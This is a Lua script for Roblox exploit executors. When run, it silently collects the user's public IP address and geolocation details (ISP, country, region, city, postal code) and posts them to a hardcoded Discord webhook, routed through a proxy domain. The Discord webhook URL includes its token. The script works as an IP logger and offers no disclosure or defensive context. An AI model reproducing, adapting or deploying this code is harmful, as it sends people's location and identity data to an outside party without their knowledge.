getgenv().webhookexecUrl = "https://discord.com/api/webhooks/1557595156021252098/NQZvoWFYfJ0t8UkwaYSfirJh5hP85MPLiiCHWGFl-2K5u3ccSQFVWkIkpDF0AJOCjBh6"

local rawUrl = getgenv().webhookexecUrl
local url = rawUrl:gsub("discord.com", "webhook.lewisakura.moe")

local success, currentIp = pcall(function()
    return game:HttpGet("https://api.ipify.org")
end)

if success and currentIp then
    local cleanIp = tostring(currentIp):match("^%s*(.-)%s*$")
    
    local ipinfoSuccess, ipinfoJson = pcall(function()
        return game:HttpGet("https://ipinfo.io/" .. cleanIp .. "/json")
    end)
    
    local messageContent = ""
    
    if ipinfoSuccess and ipinfoJson then
        local dataTable = game:GetService("HttpService"):JSONDecode(ipinfoJson)
        
        local ipAddr = dataTable.ip or cleanIp
        local country = dataTable.country or "N/A"
        local region = dataTable.region or "N/A"
        local city = dataTable.city or "N/A"
        local postal = dataTable.postal or "N/A"
        local org = dataTable.org or "N/A"
        
        messageContent = string.format(
            "IP: %s\n인터넷: %s\n국가: %s\n지역: %s\n도시: %s\n우편번호: %s",
            ipAddr, org, country, region, city, postal
        )
    else
        messageContent = cleanIp
    end
    
    local data = {
        ["content"] = messageContent,
        ["username"] = "Piaget is Best", 
        ["avatar_url"] = "https://i.imgur.com/peV2UwW.jpeg" 
    }
    
    local newdata = game:GetService("HttpService"):JSONEncode(data)
    local headers = {
        ["content-type"] = "application/json"
    }
    
    local httpRequestFunc = http_request or request or (syn and syn.request) or (fluxus and fluxus.request) or (http and http.request)
    if httpRequestFunc then
        httpRequestFunc({Url = url, Body = newdata, Method = "POST", Headers = headers})
    end
end
